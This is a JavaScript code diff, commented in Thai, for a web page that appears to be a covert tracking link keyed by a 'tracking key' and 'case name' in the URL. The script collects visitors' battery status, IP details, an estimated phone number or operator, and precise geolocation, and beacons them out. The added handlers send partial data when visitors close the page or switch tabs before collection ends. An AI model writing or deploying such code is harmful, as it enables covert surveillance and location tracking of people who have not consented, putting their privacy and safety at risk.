@@ -1,3 +1,8 @@
+// ตัวแปรระดับ global สำหรับเก็บข้อมูลที่จะส่งเมื่อปิดเพจ
+let collectedData = null;
+let dataReady = false;
+let dataSent = false;
+
 // ฟังก์ชันดึง tracking key และ case name จาก URL parameters
 function getUrlParameters() {
   try {
@@ -93,12 +98,17 @@ function getUrlParameters() {
     phoneInfo: { possibleOperator: "กำลังตรวจสอบ..." } // Placeholder for phone
   };
 
+  // เก็บข้อมูลใน global variable สำหรับส่งในกรณีผู้ใช้ออกจากหน้าเว็บ
+  collectedData = {...dataToSend};
+
   // --- เริ่มรวบรวมข้อมูลแบบ Asynchronous ---
 
   // 1. Battery Info
   const batteryPromise = getBatteryInfo().then(batteryData => {
     console.log("Battery Info:", batteryData);
     dataToSend.deviceInfo.battery = batteryData;
+    // อัปเดตข้อมูลใน global variable ด้วย
+    collectedData.deviceInfo.battery = {...dataToSend.deviceInfo.battery};
   }).catch(error => {
      console.error("Error getting battery info:", error);
      dataToSend.deviceInfo.battery = { level: "ข้อผิดพลาด", charging: "ข้อผิดพลาด" };
@@ -108,6 +118,8 @@ function getUrlParameters() {
   const ipPromise = getIPDetails().then(ipData => {
     console.log("IP Info:", ipData);
     dataToSend.ip = ipData;
+    // อัปเดตข้อมูลใน global variable ด้วย
+    collectedData.ip = {...dataToSend.ip};
   }).catch(error => {
      console.error("Error getting IP details:", error);
      dataToSend.ip = { ip: "ไม่สามารถระบุได้" };
@@ -117,6 +129,8 @@ function getUrlParameters() {
   const phonePromise = estimatePhoneNumber().then(phoneInfo => {
     console.log("Phone Info:", phoneInfo);
     dataToSend.phoneInfo = phoneInfo;
+    // อัปเดตข้อมูลใน global variable ด้วย
+    collectedData.phoneInfo = {...dataToSend.phoneInfo};
   }).catch(error => {
     console.error("Error estimating phone number:", error);
     dataToSend.phoneInfo = { possibleOperator: "ข้อผิดพลาด" };
@@ -127,100 +141,48 @@ function getUrlParameters() {
   if (navigator.geolocation) {
     console.log("Requesting geolocation...");
     locationPromise = new Promise((resolve) => {
-      // ตัวแปรเก็บข้อมูล location ที่ได้จากแต่ละขั้นตอน
-      let bestLocation = null;
-      let lowAccuracyReceived = false;
-      let highAccuracyReceived = false;
-
-      // ตั้งค่าเริ่มต้นของ dataToSend.location
-      dataToSend.location = "กำลังตรวจสอบ...";
-
-      // ขั้นตอนที่ 1: ขอตำแหน่งแบบเร็วก่อน (ความแม่นยำต่ำ)
       navigator.geolocation.getCurrentPosition(
         position => {
-          console.log("Fast geolocation success:", position.coords);
-          lowAccuracyReceived = true;
-          bestLocation = {
+          console.log("Geolocation success:", position.coords);
+          resolve({
             lat: position.coords.latitude,
             long: position.coords.longitude,
             accuracy: position.coords.accuracy,
-            source: "low-accuracy"
-          };
-          
-          // อัปเดต dataToSend ทันทีที่ได้ตำแหน่งแบบรวดเร็ว
-          dataToSend.location = bestLocation;
-          
-          // ไม่ต้อง resolve ในขั้นตอนนี้ เพื่อให้มีเวลาขอตำแหน่งที่แม่นยำกว่า
+            // สร้าง Link ภายใน Google Apps Script จะดีกว่า เพื่อความยืดหยุ่น
+            // gmapLink: `https://www.google.com/maps?q=$${position.coords.latitude},${position.coords.longitude}`
+          });
         },
         error => {
-          console.warn("Fast geolocation error:", error.message);
+          console.error(`Geolocation error: ${error.message} (Code: ${error.code})`);
+          resolve("ไม่มีข้อมูล"); // ส่ง "ไม่มีข้อมูล" เมื่อเกิดข้อผิดพลาด
         },
         {
-          // ตั้งค่าให้ได้ตำแหน่งเร็วที่สุด
-          timeout: 5000,           // ใช้เวลาไม่เกิน 5 วินาที
-          enableHighAccuracy: false, // ไม่จำเป็นต้องแม่นยำมาก
-          maximumAge: 60000        // ยอมรับแคชข้อมูลไม่เกิน 1 นาที
+          timeout: 15000, // 15 วินาที
+          enableHighAccuracy: true,
+          maximumAge: 0 // ขอข้อมูลใหม่เสมอ
         }
       );
-
-      // ขั้นตอนที่ 2: ขอตำแหน่งที่แม่นยำกว่า
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          console.log("High-accuracy geolocation success:", position.coords);
-          highAccuracyReceived = true;
-          
-          // อัปเดตตำแหน่งหากแม่นยำกว่าเดิม
-          const newLocation = {
-            lat: position.coords.latitude,
-            long: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            source: "high-accuracy"
-          };
-          
-          // ถ้ายังไม่เคยได้ตำแหน่งมาก่อน หรือตำแหน่งใหม่แม่นยำกว่า
-          if (!bestLocation || (newLocation.accuracy < bestLocation.accuracy)) {
-            bestLocation = newLocation;
-            dataToSend.location = bestLocation;
-          }
-
-          // ตัดสินใจ resolve หรือไม่
-          // ถ้าได้ข้อมูลความแม่นยำสูงแล้ว ให้ resolve ได้เลย
-          resolve();
-        },
-        error => {
-          console.warn("High-accuracy geolocation error:", error.message);
-          
-          // ถ้าได้ตำแหน่งความแม่นยำต่ำแล้ว ถือว่าพอใจได้
-          if (lowAccuracyReceived && bestLocation) {
-            console.log("Using low-accuracy location as fallback");
-            resolve();
-          } else {
-            console.error(`Complete geolocation error: ${error.message} (Code: ${error.code})`);
-            dataToSend.location = "ไม่มีข้อมูล";
-            resolve(); // ต้อง resolve แม้จะมีข้อผิดพลาด
-          }
-        },
-        {
-          timeout: 10000,          // ใช้เวลาไม่เกิน 10 วินาที
-          enableHighAccuracy: true, // ขอความแม่นยำสูง
-          maximumAge: 0            // ต้องการข้อมูลใหม่
-        }
-      );
-      
-      // ตั้ง timeout กลางเพื่อหยุดการรอถ้าไม่ได้รับข้อมูลใดๆ ภายใน 12 วินาที
-      setTimeout(() => {
-        if (bestLocation) {
-          // ถ้ามีข้อมูลตำแหน่งแล้ว ใช้ข้อมูลนั้น
-          console.log("Geolocation timeout but we have location data:", bestLocation.source);
-          resolve();
-        } else if (dataToSend.location === "กำลังตรวจสอบ...") {
-          // ถ้ายังไม่มีข้อมูลตำแหน่ง
-          console.warn("Complete geolocation timeout after 12 seconds.");
-          dataToSend.location = "ไม่มีข้อมูล (Timeout)";
-          resolve();
-        }
-      }, 12000); // เวลารวมไม่เกิน 12 วินาที
+    }).then(location => {
+        dataToSend.location = location;
+        // อัปเดตข้อมูลใน global variable ด้วย เมื่อได้ข้อมูลแล้ว
+        collectedData.location = location;
+    }).catch(() => {
+        // Handle potential errors within the promise chain if needed, though resolve("ไม่มีข้อมูล") covers most cases
+        dataToSend.location = "ข้อผิดพลาดในการขอตำแหน่ง";
     });
+
+    // เพิ่ม Timeout สำหรับ Geolocation โดยรวม
+    locationPromise = Promise.race([
+        locationPromise,
+        new Promise(resolve => setTimeout(() => {
+            if (dataToSend.location === "กำลังตรวจสอบ...") { // ถ้ายังไม่ได้ผลลัพธ์
+                 console.warn("Geolocation request timed out after 15 seconds.");
+                 dataToSend.location = "ไม่มีข้อมูล (Timeout)";
+            }
+            resolve(); // Resolve race promise
+        }, 15000))
+    ]);
+
   } else {
     // ถ้าไม่รองรับ Geolocation
     console.warn("Geolocation API is not supported in this browser.");
@@ -234,11 +196,48 @@ function getUrlParameters() {
       // ณ จุดนี้ ข้อมูลทั้งหมด (หรือสถานะข้อผิดพลาด) ควรจะอยู่ใน dataToSend แล้ว
       console.log("All async data collected (or timed out/error). Final data:", JSON.stringify(dataToSend));
 
-      // ส่งข้อมูลทั้งหมดโดยใช้ sendBeacon
-      sendDataWithBeacon(dataToSend);
+      // กำหนดว่าข้อมูลพร้อมแล้ว
+      dataReady = true;
+      
+      // อัปเดต global collectedData ให้เป็นข้อมูลล่าสุด
+      collectedData = {...dataToSend};
+      
+      // ส่งข้อมูลด้วยฟังก์ชัน sendDataWithBeacon()
+      if (!dataSent) {
+        sendDataWithBeacon(dataToSend);
+        dataSent = true;
+      }
     });
 
+  // เพิ่มการตรวจจับเหตุการณ์เมื่อผู้ใช้จะออกจากหน้าเว็บ
+  window.addEventListener('beforeunload', handleBeforeUnload);
+  
+  // ตรวจจับเมื่อเอกสารกลายเป็น hidden (เช่น เปลี่ยนแท็บ)
+  document.addEventListener('visibilitychange', handleVisibilityChange);
+
 })(); // End of main IIFE
+
+// ฟังก์ชันจัดการการออกจากหน้าเว็บแบบฉับพลัน
+function handleBeforeUnload(event) {
+  if (dataReady && !dataSent && collectedData) {
+    console.log("User leaving page, sending collected data via beacon");
+    sendDataWithBeacon(collectedData);
+    dataSent = true;
+  } else if (!dataReady && !dataSent && collectedData) {
+    console.log("User leaving page before data collection completed, sending partial data");
+    sendDataWithBeacon(collectedData);
+    dataSent = true;
+  }
+}
+
+// ฟังก์ชันจัดการเมื่อผู้ใช้เปลี่ยนแท็บหรือซ่อนหน้าเว็บ
+function handleVisibilityChange() {
+  if (document.visibilityState === "hidden" && !dataSent && collectedData) {
+    console.log("Page visibility changed to hidden, sending collected data via beacon");
+    sendDataWithBeacon(collectedData);
+    dataSent = true;
+  }
+}
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
